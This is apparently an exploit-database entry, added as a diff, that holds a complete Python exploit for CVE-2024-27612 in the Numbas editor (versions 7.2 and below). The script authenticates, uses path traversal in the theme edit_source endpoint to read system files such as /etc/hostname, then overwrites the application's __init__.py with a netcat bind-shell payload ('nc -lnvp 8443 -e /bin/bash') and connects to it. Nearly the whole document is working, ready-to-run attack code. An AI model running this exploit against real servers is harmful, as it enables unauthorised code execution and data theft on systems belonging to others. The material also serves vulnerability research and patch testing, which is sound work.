@@ -1,0 +1,173 @@
+id: 39430
+date: 03/11/2024
+title: Numbas < v7.3 - Remote Code Execution Exploit
+author: Matheus Alexandre
+cves: CVE-2024-27612
+
+# Exploit Title: Numbas < v7.3 - Remote Code Execution
+# Exploit Author: Matheus Boschetti
+# Vendor Homepage: https://www.numbas.org.uk/
+# Software Link: https://github.com/numbas/Numbas
+# Version: 7.2 and below
+# Tested on: Linux
+# CVE: CVE-2024-27612
+
+import sys, requests, re, argparse, subprocess, time
+from bs4 import BeautifulSoup
+
+s = requests.session()
+
+def getCSRF(target):
+    url = f"http://{target}/"
+    req = s.get(url)
+    soup = BeautifulSoup(req.text, 'html.parser')
+    csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value']
+    return csrfmiddlewaretoken
+
+def createTheme(target):
+    # Format request
+    csrfmiddlewaretoken = getCSRF(target)
+    theme = 'ExampleTheme'
+    boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1'
+    data = (
+        f'--{boundary}\r\n'
+        'Content-Disposition: form-data; name="csrfmiddlewaretoken"\r\n'
+        '\r\n'
+        f'{csrfmiddlewaretoken}\r\n'
+        f'--{boundary}\r\n'
+        'Content-Disposition: form-data; name="name"\r\n'
+        '\r\n'
+        f'{theme}\r\n'
+        f'--{boundary}--\r\n'
+    )
+    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}',
+               'User-Agent': 'Mozilla/5.0',
+               'Accept': '*/*',
+               'Connection': 'close'}
+
+    # Create theme and return its ID
+    req = s.post(f"http://{target}/theme/new/", headers=headers, data=data)
+    redir = req.url
+    split = redir.split('/')
+    id = split[4]
+    print(f"\t[i] Theme created with ID {id}")
+    return id
+
+def login(target, user, passwd):
+    print("\n[i] Attempting to login...")
+
+    csrfmiddlewaretoken = getCSRF(target)
+    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
+            'username': user,
+            'password': passwd,
+            'next': '/'}
+    
+    # Login
+    login = s.post(f"http://{target}/login/", data=data, allow_redirects=True)
+    res = login.text
+    if("Logged in as" not in res):
+        print("\n\n[!] Login failed!")
+        sys.exit(-1)
+
+    # Check if logged and fetch ID
+    usermatch = re.search(r'Logged in as <strong>(.*?)</strong>', res)
+    if usermatch:
+        user = usermatch.group(1)
+        idmatch = re.search(r'<a href="/accounts/profile/(.*?)/"><span class="glyphicon glyphicon-user">', res)
+        if idmatch:
+            id = idmatch.group(1)
+            print(f"\t[+] Logged in as \"{user}\" with ID {id}")
+
+def checkVuln(url):
+    print("[i] Checking if target is vulnerable...")
+
+    # Attempt to read files
+    themeID = createTheme(url)
+    target = f"http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../.."
+    hname = s.get(f"{target}/etc/hostname")
+    ver = s.get(f"{target}/etc/issue")
+    hnamesoup = BeautifulSoup(hname.text, 'html.parser')
+    versoup = BeautifulSoup(ver.text, 'html.parser')
+    hostname = hnamesoup.find('textarea').get_text().strip()
+    version = versoup.find('textarea').get_text().strip()
+    if len(hostname) < 1:
+        print("\n\n[!] Something went wrong - target might not be vulnerable.")
+        sys.exit(-1)
+    print(f"\n[+] Target \"{hostname}\" is vulnerable!")
+    print(f"\t[i] Running: \"{version}\"")
+
+    # Cleanup - delete theme
+    print(f"\t\t[i] Cleanup: deleting theme {themeID}...")
+    target = f"http://{url}/themes/{themeID}/delete"
+    csrfmiddlewaretoken = getCSRF(url)
+    data = {'csrfmiddlewaretoken':csrfmiddlewaretoken}
+    s.post(target, data=data)
+
+
+def replaceInit(target):
+    # Overwrite __init__.py with arbitrary code
+    rport = '8443'
+    payload = f"import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])"
+    csrfmiddlewaretoken = getCSRF(target)
+    filename = '../../../../numbas_editor/numbas/__init__.py'
+    themeID = createTheme(target)
+    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
+            'source': payload,
+            'filename': filename}
+
+    print("[i] Delivering payload...")
+    # Retry 5 times in case something goes wrong...
+    for attempt in range(5):
+        try:
+            s.post(f"http://{target}/themes/{themeID}/edit_source", data=data, timeout=10)
+        except Exception as e:
+            pass
+    
+    # Establish connection to bind shell
+    time.sleep(2)
+    print(f"\t[+] Payload delivered, establishing connection...\n")
+    if ":" in target:
+        split = target.split(":")
+        ip = split[0]
+    else:
+        ip = str(target)
+    subprocess.Popen(["nc", "-n", ip, rport])
+    while True:
+        pass
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    if len(sys.argv) <= 1:
+        print("\n[!] No option provided!")
+        print("\t- check: Passively check if the target is vulnerable by attempting to read files from disk\n\t- exploit: Attempt to actively exploit the target\n")
+        print(f"[i] Usage: python3 {sys.argv[0]} <option> --target 172.16.1.5:80 --user example --passwd qwerty")
+        sys.exit(-1)
+
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit')
+    parser.add_argument('--target', help='Target IP:PORT')
+    parser.add_argument('--user', help='Username to authenticate')
+    parser.add_argument('--passwd', help='Password to authenticate')
+    args = parser.parse_args()
+    action = args.action
+    target = args.target
+    user = args.user
+    passwd = args.passwd
+
+    print("\n\t\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-")
+    
+    if action == 'check':
+        login(target, user, passwd)
+        checkVuln(target)
+    elif action == 'exploit':
+        login(target, user, passwd)
+        replaceInit(target)
+    else:
+        sys.exit(-1)
+
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-03-15]  #
